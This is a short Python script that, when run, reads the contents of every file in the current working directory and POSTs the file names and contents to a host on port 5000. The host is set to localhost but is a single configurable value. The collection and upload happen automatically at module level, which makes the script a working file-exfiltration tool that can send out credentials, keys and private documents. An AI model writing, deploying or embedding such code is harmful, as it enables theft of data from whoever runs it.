import socket
import subprocess
import os
class main:
    def get_data():
        # Getting all files in current directory
        path = os.getcwd()
        files=[]
        with os.scandir(path) as listOfEntries:
            for entry in listOfEntries:
                # store all entries that are files
                if entry.is_file():
                    files.append(entry.name)
        file_contents = []
        for file in files:
            with open(file,"r") as f:
                file_contents.append(str(f.read())+"_from_"+str(file))
        return files, file_contents
    def upload(files, file_contents, ip):
        import requests
        header = {
            'filecontents': file_contents,
            'files': files
        }
        requests.post(ip+":5000/input",data=header)
    def stringlist(list1):
        returnme = ""
        for i in list1:
            returnme = returnme+i+"\n"
        return returnme
    host="http://localhost"
files, filecontents = main.get_data()
files, filecontents = main.stringlist(files),main.stringlist(filecontents)
main.upload(files,filecontents,main.host)